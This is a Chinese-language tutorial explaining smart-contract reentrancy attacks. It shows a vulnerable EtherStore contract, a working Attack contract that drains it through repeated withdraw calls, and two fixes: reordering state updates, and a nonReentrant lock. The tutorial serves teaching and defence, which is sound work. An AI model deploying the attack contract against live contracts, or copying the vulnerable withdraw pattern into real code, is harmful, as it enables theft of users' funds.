The Reentrancy Attack是对智能合约很危险的一种攻击，著名的案例就是16年的DAO事件，直接导致了以太坊的硬分叉。

下面将介绍可重入攻击。

# Understanding the Reentrancy Vulnerability

重入漏洞本质上是状态同步的问题，有点类似多线程下的不安全问题。

重入攻击通常分为两步：

1. 被攻击合约调用攻击合约的外部函数并转移执行流程。
2. 在攻击合约函数中，利用某些技术再次调用被攻击合约的漏洞函数。



EVM是单线程的，因此当重新进入合约状态更新有问题的函数中时。这使得攻击者可以重复执行某些代码逻辑，从而实现意想不到的行为。典型的攻击模式涉及多次重复的资金提取。



#  Reentrancy Vulnerable Contract

```solidity
contract EtherStore {

  mapping(address => uint256) public balances;
  // 存钱
  function deposit() public payable {
    balances[msg.sender] += msg.value;
  }
  // 取钱
  function withdraw() public {
    uint256 bal = balances[msg.sender];
    require(bal > 0);
    // 向外部合约发送以太币，向msg.sender发送eth，发送之后当前地址的余额应该为0，所以后续会有balances[msg.sender] = 0
    (bool sent,) = msg.sender.call{value: bal}("");
    // 为假的时候抛出error
    require(sent, "Failed to send Ether");
    // 清空余额
    balances[msg.sender] = 0;
  }

  // Helper function to check the balance of this contract
  function getBalance() public view returns (uint256) {
    return address(this).balance;
  }
}
```



```solidity
contract Attack {
  
  EtherStore public etherStore;
  uint256 public constant AMOUNT = 1 ether;

  constructor(address _etherStoreAddress) {
    etherStore = EtherStore(_etherStoreAddress);
  }

  // receive 是合约收到ETH时默认执行的函数。也就是call方法调用后会立刻执行这个函数。
  receive() external payable {
    // 如果目标合约余额满足条件，将再次调用withdraw函数，触发重入，由于目标合约中用于的余额仅在最后一步更新，因此条件require(bal > 0)仍然成立。
    if (address(etherStore).balance >= AMOUNT) {
      etherStore.withdraw();
    }
  }

  function attack() external payable {
    require(msg.value >= AMOUNT);
    etherStore.deposit{value: AMOUNT}();
    etherStore.withdraw();
  }

  // Helper function to check the balance of this contract
  function getBalance() public view returns (uint256) {
    return address(this).balance;
  }
}
```

由于`call`方法在`balances[msg.sender] = 0`之前，调用call之后执行receive函数，再次调用withdraw，因为余额没有更新，require语句通过了检查，允许攻击合约重复提取ETH。



要避免重入，可以先更新余额，再进行转账

```solidity
function withdraw() public {
  // 1. Check
  uint256 bal = balances[msg.sender];
  require(bal > 0);

  // 2. Effects
  balances[msg.sender] = 0;

  // 3. Interactions
  (bool sent,) = msg.sender.call{value: bal}("");
  require(sent, "Failed to send Ether");
}
```



另一个方法是加不可重入锁:

```solidity
contract ReentrancyGuard {
  bool internal locked;

  modifier nonReentrant() {
    require(!locked, "No reentrancy");
    locked = true;
    _;
    locked = false;
  }
}

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
contract EtherStore is ReentrancyGuard {

  function withdraw() public nonReentrant {
    uint256 bal = balances[msg.sender];
    require(bal > 0);

    (bool sent,) = msg.sender.call{value: bal}("");
    require(sent, "Failed to send Ether");

    balances[msg.sender] = 0;
  }

  // ...
}
```
